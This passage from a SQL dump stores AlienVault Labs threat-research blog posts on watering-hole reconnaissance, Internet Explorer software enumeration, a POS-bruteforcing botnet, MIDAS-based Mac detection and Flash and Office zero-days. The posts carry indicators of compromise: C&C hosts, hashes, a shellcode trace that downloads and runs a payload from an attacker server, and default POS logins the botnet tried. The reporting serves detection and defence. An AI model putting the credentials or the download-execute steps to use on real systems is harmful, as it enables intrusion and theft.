C&C:17b077840ab874a8370c98c840b6c671\n7bd2207dcef1878109e88a4527162d09\n89c136eae9163d63918e0ef59bd6ac82\nd1b11795c3e3736de834abc39f7bd76a\n1d648b48d1e2b0f2855e2659f32c94ad\n48feab46efc26519820e5b8a9152e529\ne54d5fef5e3c050f529e814dca4d8014\n83f5aef0de9da8cb813c5c8ffbaf1ead\nb47739296783ac7fced9ccb49c833ae8\n09102b0fe2be8b85136d454b14ec7398\ndbcb2d297e5d79c5a161801b2be775ba\n30b729137b5ee8805e3e9cc1dbb75609\na615334472c30ee680f798e3849def66\n8268f911c87a33f29c00af1dd2c1c2a6\n389c5931703a031faebf5f5406f86752\n2da11eb62f514abc2ea68271655cb791', 'malwareinternet explorerexploitexploit kit', '/blogs/labs-research/archie-just-another-exploit-kit');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (40, 'Scanbox: A Reconnaissance Framework Used with Watering Hole Attacks', 'Jaime Blasco', 'August 28, 2014 ', 'A few days ago we detected a watering hole campaign in a website owned by one big industrial company.The website is related to software used for simulation and system engineering in a wide range of industries, including automotive, aerospace, and manufacturing.The attackers were able to compromise the website and include code that loaded a malicious Javascript file from a remote server. This Javascript file is a framework for reconnaissance that the attackers call \"Scanbox\" and includes some of the techniques we described in a previous blog post: Attackers abusing Internet Explorer to enumerate software and detect security products  The Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:RefererUser-AgentLocationCookieTitle (To identify specific content that the victim is visiting)DomainCharsetScreen width and heightOperating SystemLanguageResulting in something like this:Before sending the information to the C&C server, Scanbox encodes and encrypts the data with the following function:Producing the following request:If we decrypt the data it translates to:After the first request, the framework contains several plugins to extract different information from the victim.Pluginid 1: Enumerates software installed in the system using the technique we explained before that affects Internet Explorer. It also checks if the system is running different versions of EMET (Enhanced Mitigation Experience Toolkit):Producing the list of security software on the targetPluginid 2: Enumerates Adobe Flash versionsPluginid 5: Enumerates Microsoft Office versionsPluginid 6: Enumerates Acrobat Reader versionsPluginid 8: Enumerates Java versionsPluginid 21: Implements a “keylogger” functionality trough Javascript that logs all the keystrokes the victim is typing inside the compromised website.While the user is browsing the compromised website, all keystrokes are being recorded and sent to the C&C periodically. It will also send keystrokes when the user submits web forms that can potentially include passwords and other sensitive data.As we have seen, this is a very powerful framework that gives attackers a lot of insight into the potential targets that will help them launching future attacks against them.We have also seen several Metasploit-produced exploits that target different versions of Java in the same IP address that hosts the Scanbox framework (122.10.9[.]109).We recommend you look for this type of activity against the following machines in your network:mail[.]webmailgoogle.comjs[.]webmailgoogle.com122[.]10.9.109', 'scanboxwatering hole', '/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (41, 'Attackers abusing Internet Explorer to enumerate software and detect security products', 'Jaime Blasco', 'July 25, 2014 ', 'During the last few years we have seen an increase on the number of malicious actors using tricks and browser vulnerabilities to enumerate the software that is running on the victim’s system using Internet Explorer.In this blog post we will describe some of the techniques that attackers are using to perform reconnaisance that gives them information for future attacks. We have also seen these techniques being used to decide whether or not they exploit the victim based on detected Antivirus, versions of potential vulnerable software or the presence of certain security features such as Enhanced Mitigation Experience Toolkit EMET. EMET is a Microsoft tool that uses security mitigation to prevent vulnerabilities from being successfully exploited.  This makes it more difficult for attackers – so they would prefer to avoid it.1. Abusing res:\\\\ The first technique we are describing affects Internet Explorer 8 and earlier. Internet Explorer blocks attempts to access the local file system using “file://” but it used to be possible to access image files within a resource section of a DLL/EXE. In a previous blog post we mentioned how attackers were using this technique as part of a waterhole campaign affecting a Thailand NGO. In that case we found the following code in the HTML of the affected website:The resList array contains a list of executable files with resource sections containing an image file. An example using explorer.exe: {id: \'Windows Explorer\', res: \'res://explorer.exe/#2/#143\'}If we take a look at the resource sections present on explorer.exe we can find a resource named 143: The resLis array contains a big list of executable files that is used to detect Antivirus software and VMware (probably to check if it is an analysis machine used by a security researcher):The complete list of detected software is: Webroot Sophos Microsoft Security Client F-Secure BitDefender Norton Antivirus McAfee Antivirus Kingsoft Antivirus Avira Antivirus Kaspersky Antivirus 360 AV ESET NOD32 Trend Micro Internet Security Rising AntivirusVmware PlayerVmware ToolsWe found similar code being used by the Sykipot actors in combination with a phishing scheme. In that case the list of software was much longer and it detected common software along with security products:The list of detected software:Microsoft Office (all versions)WPS (Kingsoft Office)WinrarWinzip7zAdobre Reader (all versions)SkypeMicrosoft Outlook (all versions)Yahoo Messenger (all versions)FlashgetThunderEmuleServ-URAdminUltraVNCpcAnywhereRealVNCFetionGoogle TalkAliIMPOPOICQLiteICQTencent MessengerSina UCQQBaihIAIMMicrosoft MessengerWindows Live MSNWindows Media Player (all versions)SSReaderPPStreamStorm PlayerTTPlayerHaojie SuperPlayerWinampKuGooUltraEditSylpheedACDSeePhotoshopFoxmailGmail NotifierWindows Live MailAdobe Media PlayerFlash CSDreamwearFireworksDelphiJavaVMware ToolsTracks EraserMicrosoft Virtual PCVMwareMicrosoft ActiveSyncMicrosoft .NETPGPCCClientDriverGeniusDaemon ToolsMagicSetBaidu ToolFoxit ReaderMySQL Server (all versions)SQLyogFirefoxWorld IETT IEGoogle ChromeMaxthon360 IEOperaSafariSaaYaaGreenBrowserSecurity software detected:Microsoft Security EssentialsAVG360SSMKeniuESETNOD32Skynet FirewallKingsoftNortonRising AVKasperskyJingMin kavMcafeeBitDefenderAntiVirTrendMicroAviraDr WebAvastSophosZone AlarmPanda SecurityThey also used this code snippet to detect Adobe Acrobat Reader (English, Chinese and Taiwanese.)Finally they were also able to list the patches that were installed in the Microsoft platform using a predefined list of patch numbers:2. Microsoft XMLDOM ActiveX control information disclosure vulnerabilityAnother technique we found is being used by the Deep Panda actors.  They usually use this code in waterholing campaigns to detect specific software installed on the intended victim\'s system. It exploits the XMLDOM ActiveX to check for the presence of multiple files and folders:This vulnerability was disclosed last year and it affects Internet Explorer versions 6 through 11 running on Windows through version 8.1.Software enumerated includes most of the Antivirus and endpoint security products on the market:7zAhnLab_V3BkavHomeJavaCOMODODr.WebESET-SMARTESTsoftF-PROTF-SecureFortinetIKARUSImmunetJiangMinKaspersky_2012Kaspersky_2013Kaspersky_Endpoint_Security_8MseNormanNortonNprotectOutpostPC_ToolsQuickHealRisingRising_firewallSQLServerSUPERAntiSpywareSunbeltSymantec_Endpoint12Trend2013ViRobot4VirusBusterWinRARa-squaredantiyfxavg2012bitdefender_2013eScaneset_nod32f-secure2011iTunesmcafee-x64mcafee_enterprisenorth-x64sophossymantec-endpointsystemwalersystemwaler-captrendtrend-x64var justforfunpathvmware-clientvmware-serverwinzip3. More XMLDOM vulnerabilitiesAt the beginning of the year we found a different method being used in combination with a Zeroday vulnerability affecting Internet Explorer (CVE-2014-0322) targeting the French Aerospace Association. In that case we found the following code snippet.The attackers were using a similar technique to detect if EMET was present on the system.  If EMET was detected they didn’t trigger the exploit since EMET was able to block it and alert the user to the 0 Day and diminish the attacker\'s effectiveness.A month after the exploit code was made public we detected the same technique being used in the Angler Exploit Kit. They were using it to detect Kaspersky Antivirus.In recent samples of the Angler Exploit Kit we have seen an improved version where they added detection for TrendMicro products.In this blog post we have given an overview of the different techniques attackers are using to enumerate software running on a remote system.  These techniques can give attackers information that they can use in future attacks to exploit certain vectors based on the software running (or not running) on a system. In addition, we\'ve illustrated ways were cybercriminals have adapted and copied techniques used by more advanced attackers for their own purposes.References:Vulnerability in Internet Explorer 10.1XMLDOM vulnerabilityURI Use and AbuseAngler Exploit Kit', 'sykipotinternet explorervulnerabilitieswaterholeangler exploit kitdetecting endpoint software', '/blogs/labs-research/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (42, 'Botnet bruteforcing Point Of Sale terminals via Remote Desktop', 'Jaime Blasco', 'March 11, 2014 ', 'Every single day our automated systems analyze hundreds of thousands of malicious samples. Yesterday one of the samples caught my attention because the malware started performing bruteforce attacks against Remote Desktop using certain username and passwords.MD5: c1fab4a0b7f4404baf8eab4d58b1f821Other similar samples:\nc0c1f1a69a1b59c6f2dab18135a73919 \n08863d484b1ebe6359144c9a8d8027c0\n\nOnce started the malware copy itself to \\Documents and Settings\\Administrator\\Application Data\\lsacs.exe and starts the communication with the C&C sending data about the status of the bot (number of hosts bruteforced, packets per second, number threatds, version, etc).and the server replies with a configuration block containing:- Login/Password list to use during bruteforcing- Timestamp- List of IP Addresses to attack- Number of threads to use- Interval As you can see some of the user/passwords that they are using (pos, pos1, pos01, shop, station, hotel, atm, atm1, micros, microssvc) are the default ones commonly used in Point of Sale terminals by retailers and businesses all around the world.The control panel of the botnet is also hosted in the same server:This is not new, we know cybercriminals have been using this technique to compromise Point of Sale systems for years. Once they gain access to the terminal using one of the default credentials, they upload a second stage payload commonly known as a memory scrapper that is a piece of malware that searchs for credit card data in memory before it has been encrypted. Some examples are:- BlackPOS- VSkimmer- Alina- RetalixScrapper- DexterThese pieces of malware are able to extract the credit card data from the terminal and exfiltrate the data to the attackers that will then sell the information in the black market.When it comes to detect the infection of a system in your network, this is how our AlienVault Unified Security Management (USM) will detect a compromised assset in your network: USM is able to detect both the communication wit the the C&C server and the network activity that is generated when the malware performs bruteforce attacks against devices on the Internet. It is worth mentioning that the C&C server IP address was already in our Open Threat Exchange database and the correlation engine used that information to generate an alarm about a system compromise.  If you want to try yourself you can download our Open Source SIEM - OSSIM or the Free 30 day trial of AlienVault Unified Security Management (USM)We have shown how these threats can impact companies using Point Of Sale terminals, specially those retailers and medium and small businesses that don\'t have visibility into the systems that are part of their networks and handle credit card information.Some recommendations to protect against these kind of attacks are:- Change default credentials of POS systems- Configure an access control list- Keep your software up-to-date- Install an Antivirus solution- Centralize and monitor the logs from your POS systems to detect potential security breaches', 'credit cardspcipospoint of sale', '/blogs/labs-research/botnet-bruteforcing-point-of-sale-via-remote-desktop');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (43, 'Detecting malware on Mac OS X with USM and MIDAS', 'Bill Smartt', 'February 25, 2014 ', 'Let’s briefly review what we accomplished in the first post:Understood the capabilities and design of MIDASDeployed MIDAS on a Mac OS X endpointinstalled the MIDAS plugin in AlienVault USMVerified the integration by running MIDAS and confirming the events in the SIEMHow does this make us safer? More generally, what does this mean?\n\nTo answer these questions we need to understand what plists and kexts mean from a security perspective.Plists\nProperty list files contain configuration data for a variety of system components including applications, volumes, sessions, daemons, etc. Plists use the XML format but can also be binary. Often, malware and exploits leave behind traces of evidence in the form of plists. An attacker that wants to achieve persistence on your system will likely need to create or modify a plist to do so. Monitoring new, changed, and removed plists has a variety of uses:malware infectionsexploitscompany policy violationsbehavioral analysisKexts\nKernel extensions (kext in Apple lingo) are code libraries that get attached to and run in kernel mode. Legitimate kexts are often device drivers for external hardware. Due to their privileged execution and direct access to the kernel, kexts are important to keep track of from a security perspective. While there aren’t a wide variety of use cases for kext monitoring, the few that exist are of great importance to organizations that take security seriously:rootkit detectionWe can define directives to detect all the behaviors above. Plists (and kexts) provide an opportunity to identify known malicious characteristics and detect the infections automatically. In fact, you can define more complex cross-correlation directives that correlate a MIDAS event with a Snort event, or any other data source USM has access to.\n\nNow that we understand how MIDAS can help us detect malware, let’s look at a concrete example. I will be working with a piece of malware called OSX/leverage.a (VirusTotal) that one of my teammates recently did a blog post on, so the hard work is finished. OSX/Leverage.a has allegedly been used recently by the Syrian Electronic Army in phishing campaigns. Looking at his work we can see the C&C relies upon a plist to achieve persistence. That’s a perfect place to start, because MIDAS can detect new plists being added to the system. The plist it will create is:~/Library/LaunchAgents/UserEvent.System.plistWe can use the FIND: method in the userdata1 value to match on the plist name. So here’s a correlation rule to detect the OSX/Leverage.a malware:<directive id=\"41073\" name=\"MacOSX Malware detected - Leverage.A\" priority=\"10\">\n    <rule type=\"detector\" name=\"test\" reliability=\"5\" occurrence=\"1\" from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\" plugin_id=\"1987\" plugin_sid=\"8\" protocol=\"ANY\" userdata1=\"FIND:UserEvent.System.plist\"/>\n</directive>The relevant fields are name — the alarm name to use when triggered, plugin_id and plugin_sid — taken from alienvault_integration/midas.sql, and the expected value for userdata1. We can add this directive in Configuration > Threat Intelligence > Directives > AlienVault Malware:Back at the top of the page, you can run ‘Test rules’ to make sure your newly defined correlation directive is valid. Run MIDAS once to process the baseline for the system before the infection. You should see the events come through in the SIEM. Now we can infect the OS X system. Let’s unzip the sample and open the malicious image:Now if we run MIDAS again and watch syslog on the USM instance, we will see MIDAS properly detects the plist created by the malware. Here is the exact log line that serves as evidence of a system compromise, which we\'ve built out correlation directive to trigger on:Feb 22 06:32:12 r00ts-Mac.local launcher.py[517]: 2014-02-22T14:32:11-0800 r00ts-Mac.local ty[example_analyzeplist]: ty_name=\"plist\" keepalive=\"None\"hash=\"e27cd6bee4f1e6e8661b7bc1911053045cf23f44\"date=\"Sat, 22 Feb 2014 14:32:12\"runatload=\"None\"name=\"/Users/r00t/Library/LaunchAgents/UserEvent.System.plist\"This gets imported into the SIEM and we can confirm the fields have been populated properly:Now if we navigate to Analysis > Alarms, we will find our alarm was generated:If we click ‘View Details’, we will get more info about this alarm:The last step to deploying MIDAS is configure it to run as a LaunchDaemon. This will enable MIDAS to run on a scheduled basis (currently set to run every 60min). To do this, we will add a property list (plist) to the ~/Library/LaunchDaemons/ directory. We have provided a plist that you can use, but you should never install a plist from an untrusted source without scrutinizing it. The plist is located atalienvault_integration/com.labs.alienvault.midas.cron.plistTake a look at the plist we\'ve provided, you may need to edit the paths to the executables in the plist and runscript. Once you are confident in what the plist does you can install it on your system.Resources\nloading and unloading a plist\nconverting a plist from xml to binary', 'ossimalienvaultmacosxsiempluginsapplemacmidasplist', '/blogs/labs-research/detecting-malware-on-mac-os-x-with-usm-and-midas');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (44, 'Analysis of an attack exploiting the Adobe Zero-day - CVE-2014-0502', 'Jaime Blasco', 'February 21, 2014 ', 'Yesterday FireEye reported about a new Zero-Day affecting Adobe Flash that is being exploited in the wild and Adobe issued a security update regarding the vulnerability.Several websistes were redirecting visitors to a malicious server containing the exploit including:Peterson Institute for International EconomicsAmerican Research Center in EgyptSmith Richardson Foundationas reported by FireEye.The malicious Flash file is hosted on http://4.59.XXX.XX/common/cc.swfThe Flash file contains some interesting debug symbols:C:\\Users\\007\\Desktop\\FlashExp(ie)\\src\\cc.asThe ActionScript code inside the Flash file is reponsible for determining the operating system and selecting the hard-coded ROP chains to bypass ASLR.For Windows XP it first checks the language and only contains ROP chains to target the following languages:EnglishChineseIn this case (Windows XP) the ROP chain is built using msvcrt.dll that is a well known technique.If the system is running Windows 7:It checks if the system has Java 1.6 or Java 1.7 installed.If it runs Java 1.6 it uses the ROP chain for msvcr71.dll that is shipped with Java 1.6 and it is not protected by ASLR.\n It checks if the system has Microsoft Office 2007 or 2010If it does, it builds the ROP chain using hxds.dll that is shipped with Microsoft Office 2007/2010 and it is not protected by ASLR.In order to load hxds.dll it uses the protocol handler location.href = \'ms-help:\', a technique commonly seen in these kind of exploits.The ActionScript code is also responsible of downloading a GIF file:The download file is a valid image as we can see: But it also contains a shellcode at offset 3344 that downloads and execute a PE32 file from the same server:Extracting the shellcode from the valid image file is a clever technique since it is likely to bypass most of the network security products.The shellcode performs the following actions to download and execute PE32 file:    LoadLibraryA(wininet)    LoadLibraryA(user32)    VirtualProtect(adr=404bf1, sz=4, flags=40)    SetUnhandledExceptionFilter(0)    VirtualProtect(adr=7c81cdda, sz=82, flags=40)    VirtualProtect(adr=7c81cdda, sz=82, flags=0)    SetUnhandledExceptionFilter(7c81cdda)    GetTempPath(len=104, buf=12fca4) = 14    GetTempFileName(path=C:\\users\\jaime\\Temp\\, prefix=0, unique=0, buf=12fca4) = 245D     Path = C:\\users\\jaime\\Temp\\245d.tmp    InternetOpenA()    InternetOpenUrlA(http://4.59.XX.XX/common/update.exe)    CreateFileA(C:\\users\\jaime\\Temp\\245d.tmp) = 4    InternetReadFile(1, buf: 12fbe8, size: 64)    InternetCloseHandle(1) = 1    InternetCloseHandle(1) = 1    CloseHandle(4)The payload used in this attack is the infamous PlugX RAT (Remote Access Tool) that we have blogged about several times:Tracking down the author of the PlugX RAT The connection between the Plugx Chinese gang and the latest Internet Explorer ZerodayNew versions of the IExplorer ZeroDay emerge targeting Defence and Industrial companiesThe malware copy itself into \\All Users\\DRM\\RasTls\\RasTls.exeIt creates the following mutexes during execution:\\BaseNamedObjects\\Global\\dklw\\BaseNamedObjects\\Global\\cso\\BaseNamedObjects\\Global\\qemyqvmyhiy\\BaseNamedObjects\\Global\\eriwjjo\\BaseNamedObjects\\Global\\etniisebehheq\\BaseNamedObjects\\Global\\beetxado\\BaseNamedObjects\\Global\\zhyzrjduosfptunf\\BaseNamedObjects\\Global\\zzusnnzeqgzupeto\\BaseNamedObjects\\Global\\onwmkwazrynpn\\BaseNamedObjects\\Global\\nmtg\\BaseNamedObjects\\Global\\helbibkzhruo\\BaseNamedObjects\\Global\\opylrvflplgad\\BaseNamedObjects\\Global\\zgjawrojchcfavnh\\BaseNamedObjects\\Global\\gmd\\BaseNamedObjects\\Global\\svdwr\\BaseNamedObjects\\Global\\unbdehrrxgqujyazj\\BaseNamedObjects\\Global\\qpl\\BaseNamedObjects\\Global\\ihnwguwceofkhcv\\BaseNamedObjects\\Global\\kvxieoc\\BaseNamedObjects\\My_Name_horse (Svchost)and it injects itself into the svchost process.The PlugX sample contains three different command and control servers:00903474 -> java[.]ns1[.]name009034B8 -> adservice[.[no-ip[.]org009034FC -> wmi[.]ns01[.]usand communicates via HTTP with the C&C:Notice that specific C&C domain is sinkholed right now:To conclude, I don\'t have to mention that you should apply Adobe\'s patch as soon as possible as well as update the vulnerable Java and Office versions that are being used to bypass ASLR.Happy hunting!', '0dayplugxinternet explorerzerodayofficeflashaslr', '/blogs/labs-research/analysis-of-an-attack-exploiting-the-adobe-zero-day-cve-2014-0502');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (45, 'Securing Mac OS X with USM and MIDAS', 'Bill Smartt', 'February 20, 2014 ', 'Protecting Mac OS X systems is a hot topic these days. Their prevalence in enterprise environments has been on the rise over the past decade, and the question of how to secure them remains a mystery to many.  This post will discuss new methods for securing Mac OS X.\n\nThe internal security teams at Etsy, Facebook and GitHub recently released an interesting project: Mac OS X Intrusion Detection & Analysis System (MIDAS).  MIDAS is an open source HIDS that was designed around the Mac OS X operating system.  It is still in it’s infancy, having only been published a few months ago.  The code is up on GitHub under an Open Source license.  As you may know we love open source projects at AlienVault, so we are very excited about this. Also very few alternatives exist both in open and closed source markets for OS X. \n\nMIDAS is implemented as a collection of ‘modules’, and the authors provide a few elementary modules that serve as examples for how to write your own:Property Lists (.plist files)Kernel ExtensionsIn addition to these full modules, they provide helper functions to make building your own modules easier.  Some helpers include:List (weak) ssh keysReturn SSID of currently connected networkList DNS configuration informationlist all LaunchAgents and LaunchDaemonsMIDAS writes its results to a directory of log files:/logs/<modulename>.logMIDAS has a built in custom Object Relational Mapping (Called Trip Yarn ORM or TyORM), and results fall into three categories: new, changed, and removed. Examples of each result type are shown below, respectively:2014-02-13T16:30:48-0800 ninja.local ty[example_analyzeplist]: ty_name=\"plist\" keepalive=\"{\'SuccessfulExit\': None}\"hash=\"29f062b5a12277e48f323c03c5e882c40506fd62\"date=\"Thu, 13 Feb 2014 16:32:29\"name=\"/System/Library/LaunchDaemons/com.apple.awacsd.plist\"\n\n2014-02-14T15:56:49-0800 ninja.local ty[example_analyzeplist]: ty_name=\"plist\" name=\"/Users/bsmartt/Library/Preferences/ByHost/com.apple.identityservices.idstatuscache.D285B31B-51C2-50FF-8434-8F5E42C601AE.plist\" changed_entry=\"true\" hash=\"37705f72ba62d13e79ebdc78223fc3ff184e8587\" hash_old=\"c9cda73684b65d7fcee80188d3ad4dfaec28f4b2\" hash_last_updated=\"Fri, 14 Feb 2014 15:56:50\" hash_diff_added=\"c9cda7684b65dee808d3addfac2f4b2\" hash_diff_removed=“705f72ba62d13e79ebdc782233ff587\"\n\n2014-02-18T23:06:40-0800 ninja.local ty[example_analyzeplist]: ty_name=\"plist\" removed_entry=\"true\" name=\"com.vmware.vmioplug.10.1.26\" date=\"Tue, 18 Feb 2014 20:56:44\"\nMIDAS doesn’t have any centralized collection and there is no concept of an ‘alarm’, so it expects you can do that in your environment.  While MIDAS would probably work fine with any SIEM, AlienVault’s OSSIM is the only open source SIEM and therefore it is an ideal candidate for MIDAS integration.  Integrating MIDAS with AlienVault products is simple.  Let’s take a look:\n\nFirst you will need an OS X machine with MIDAS on it.  Our fork of MIDAS comes with everything you need for the integration.  Our repository also contains some additional detection metrics including a module to watch user creation and removal, to detect payloads that add or remove user accounts.  Grab the MIDAS source code from our repository and put it on a Mac.  Our repository is here.\n\nTo configure MIDAS on the OS X endpoint:Install the netsyslog package for python.  This is how the logs will be sent to USM.Add the IP of your USM instance to the MIDAS configuration: /midas/modules/lib/config.py: config[‘alienvault_instance’] = \"1.2.3.4\"\nMoving on to USM, we need to enable the MIDAS plugin.  There are two files that USM needs from our MIDAS repository:alienvault_integration/midas.cfgalienvault_integration/midas.sqlPut these two files on your USM instance then you can copy the plugin (.cfg) file to the plugins directory:cp midas.cfg /etc/ossim/agent/plugins/Update the SQL table definitions:ossim-db < midas.sqlRestart the server:/etc/init.d/ossim-server restartNext, in the web UI, enable the MIDAS plugin. Inside Configuration > Deployment, find your USM instance in the AlienVault center and click more info on the right:Go to the Sensor Configuration tab:Inside the Sensor Configuration, go to the deployment section, find MIDAS in the list, and click the +.  Click ‘Apply Changes\' to enable MIDAS.  If you don’t see MIDAS in the list of available plugins, you may have forgotten to add the midas.cfg file to the plugins directory, or run the ossim-db command above.Now that the MIDAS plugin is enabled, we can test it by sending some example log messages to syslog and confirming their presence in the SIEM.  For this we have provided an example MIDAS log in the repository:/alienvault_integration/example.logYou can send these example events to the USM syslog by issuing the following command:cat example.log > /var/log/syslogYou should now see these events in the SIEM events:If you examine an event in detail, you can confirm the plugin is correctly parsing the log messages.  Here we see that a new plist was discovered on 10.0.1.90:We now have events flowing from the OS X machine to USM.  MIDAS is not a daemon or agent so it needs to be invoked in order to run.  You can execute MIDAS by runningsudo python launcher.pyThis will create the database file on first run in the working directory named midas_hids.sqlite.  Now when you run MIDAS rather than the valuable data it generates sitting in a log file on one of your endpoints, the data goes straight to USM where we can leverage other data sources and types of analysis for enhanced security posture.  Stay tuned for a followup on running MIDAS scheduled task (launchctl), detecting malware with MIDAS and USM, and correlation directives.', 'ossimalienvaultmacosxsiempluginsapplemacmidasplist', '/blogs/labs-research/securing-mac-os-x-with-usm-and-midas');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'Yara signatures for “Careto” - The Masked APT', 'Alberto Ortega', 'February 19, 2014 ', 'Last week, Kaspersky Lab released their research (Unveiling \"Careto\" - The Masked APT) on a fresh APT campaign, which is supposed to had been running for several years. The campaign has different pieces of malware designed for Windows and OSX systems, and also clues of components for Android and iOS devices.The main targets of this campaign are thought to be government, diplomatic and research institutions, as well as private companies and activists.For Kaspersky, what makes Careto (also known as \"The Mask\") special is the complexity of the samples, in addition to the complete set of spying and data stealing capabilities the malware has.We have developed some Yara rules to detect the different components of the malware. We have spotted some Windows and OSX samples with this ruleset so far.Find the complete ruleset in our GitHub repository, happy hunting!', 'malwareyaraaptmalware researchcaretothemask', '/blogs/labs-research/yara-rules-for-careto-the-masked-apt');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'OTX Snapshot and top Threat Intelligence headlines from the last month', 'Jaime Blasco', 'November 14, 2013 ', 'It\'s that time again: time to wrap up some of the top research findings and headlines about Internet security threats that intrigued the AlienVault Labs team in October.October was as busy a month for security news as ever; it even went mainstream in national press with Adobe having at least 38 million accounts being breached. Having been immersed in the infosec community for quite a few years now, it’s been interesting to see how threats and the issues they bring with them are not just for a limited audience anymore; rather they are becoming part of everyday life. In the interest of sharing what we think have been the most noteworthy news stories for our community, here are the top picks from the AlienVault Labs team this month:Microsoft Office Zeroday used to attack Pakastani targetsAs we reported in our blog last week, Microsoft released a security advisory about a new Microsoft Office vulnerability being exploited in the wild. The vulnerability affects Office 2003/2007 and Office 2010 only running on Windows XP/2003.Ransomware accepts Bitcoin as a payment methodKnown as Cryptolocker, this ransomware has been around for a few months and it is one of the first to accept Bitcoins. This threat uses public crypto, so it is virtually impossible to recover your files once they have been taken ransom. However - in theory - once you pay, the attacker will send you a private key so you can recover your files. Our advice: You should never pay to release your files. Clean your computer with an anti-virus tool and use your back-ups. Look for help and IT assistance, or even contact your local authorities.Israeli tunnel hit by cyber attackWhile the origins are unclear, this attack on the Carmel Tunnels in Haifa is one of the most sophisticated seen to date and is an example of how a targeted attack can affect physical infrastructure. In this case, it appears hackers managed to close down the tunnel for two days by a computer Trojan horse that accessed the CCTV network.Blackhole exploit kit author arrestedBlackhole has dominated the crimeware market in recent years, but now we are seeing other exploit kits being used more and more as, since the arrest, the authors have not been able to update the exploit kit to avoid detection. The upshot of this is that, although cyber criminals are still using Blackhole, the detection rate is increasing. It is our hope that, eventually, it will start to die out in the wild as it stops evolving.PHP.net compromisedHere, the attackers were able to compromise the infrastructure used by PHP.net and research revealed malware, which had modified the Javascript and spread it to try and infect visitors. We traced this to the Magnitude/Popads exploit kit. In fact, our OTX system flagged that IP address a few days before as a harmful server due to the serving of Exploit Code. The site was down for about 24 hours and an infection of the website may have led to drive-by downloads for visitors.But it\'s not just about the news; at AlienVault, we collect our own data from the Open Threat Exchange (OTX) in order to share the findings and keep \"the good guys\" one step ahead. Here are the latest findings:OTX Snapshot: Top Exploits DetectedOTX Snapshot: Top Malicious FiletypesOTX Snapshot: Top Malware DetectedOTX Snapshot: Top Countries by Number of Malicious IPsVisit OTX to learn more about how you can benefit from collaborative threat intelligence.', '', '/blogs/labs-research/otx-snapshot-threat-intelligence-round-up-from-the-last-month');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Microsoft Office Zeroday used to attack Pakistani targets', 'Jaime Blasco', 'November 5, 2013 ', 'Earlier today Microsoft released a security advisory alerting about a new Microsoft Office vulnerability being exploited in the wild. The vulnerability affects Office 2003/2007 and Office 2010 only running on Windows XP/2003.The vulnerability is related to the parsing of TIFF images and Microsoft released a FixIt that basically block the rendering of TIFF images on the system.The exploit we have analyzed uses ROP gadgets and ActiveX controls to heap spray memory (instead of Flash).If they exploit is successful it uses URLDownloadToFileA to download and execute a payload from a remote HTTP server:The downloaded payload is a RAR file containing both a malicious payload and a lure Office document that is showed to the victim. We have found different payloads talking to the the same C&C server that use different lure documents. Some of the lure documents are related to the Pakistan Intelligence service (Inter-Services Intelligence or ISI) and the Pakistani military.  This payload communicates with the C&C server using the HTTP protocol:GET /logitech/[email protected]&str=&file=no HTTP/1.1\nUser-Agent: WinInetGet/0.1When we showed this traffic we realized it was familiar. In fact the same protocol was used by one of the Operation Hangover payloads. We can confirm that the downloader is based on the Deksila downloader not only because it generates similar HTTP traffic but also the way it retrieves information from the system and even the raw strings from both payloads:The presence of the following files can be used to find infected systems by different versions of the downloader:C:\\Documents and Settings\\<username>\\Temp\\iconfall.logC:\\Documents and Settings\\<username>\\HddLink.lnk    C:\\Documents and Settings\\<username>\\Updates.exeC:\\Documents and Settings\\<username>\\wincert.exeC:\\Documents and Settings\\<username>\\kayani.doc    C:\\Documents and Settings\\<username>\\Shanti.doc    C:\\Documents and Settings\\<username>\\Locations.docC:\\Documents and Settings\\<username>\\ISI.doc    C:\\Documents and Settings\\<username>\\GoodLuck.doc    C:\\cdata.txtBased on the victim information we could retrieve from the C&C server we can confirm that most of IP addresses communicating with the C&C server are based on Pakistan.When the infected system checkins on the C&C server a file is created with the following content:User : [USERNAME]\nIP : [IP_ADDRESS]\nAV : [NAME_OF_ANTIVIRUS_SOLUTION]The attackers are able to send other payloads to the infected systems (2nd stage) that are downloaded by the victims using HTTP requests. Based on the C&C information we collected this is the list of unique filenames that are being used to download 2nd stage payloads: alg.execonnhost.exelgfxsrc.exelgfxsrv.exelgfxsrvc.exemsctcd.exesvchost.exetaskmgr.exetaskngr.exewaulct.exewimhost.exewinlog.exewinlogon.exewinnit.exewinsoun.exewinword.exewmpi.exewsqmocn.exeAnd the list of unique md5s:0d51296e5c74a22339ec8b7e318f274a101852851d70dfc46c4d022ef077d5862ed6a6c349cae3842023d83c6b1ed1c54e878b13459f652a99168aad2dce7c9a654f558cf824e98dde09b197dbdfd4076a57cda67939806359a03a86fd0eabc28378abb63da7e678c76c09f44b43d02ae75ad6c8484f524d93eaf249770be699fd51dc5f1683c666a4925af8f1361d5dfd75a23d8b3345e550c4a9bbc6dd2a0eFrom all the payloads we retrieved from the C&C the following were already uploaed to Virustotal. You can notice the low Antivirus detection rate:fd75a23d8b3345e550c4a9bbc6dd2a0e  1 / 47    6a57cda67939806359a03a86fd0eabc2  1 / 47    4e878b13459f652a99168aad2dce7c9a  1 / 47    2ed6a6c349cae3842023d83c6b1ed1c5  0 / 47    Following is a description of the different payloads we found in the C&C with the purpose to help you to build IOCs (Indicators Of Compromise) and detect infected systems.Main DownloaderNetwork traffic\n\nPerform HTTP GET requests, some examples are:    /logitech/[email protected]<username>&str=&file=no     /green/[email protected]<username>&str=&file=no    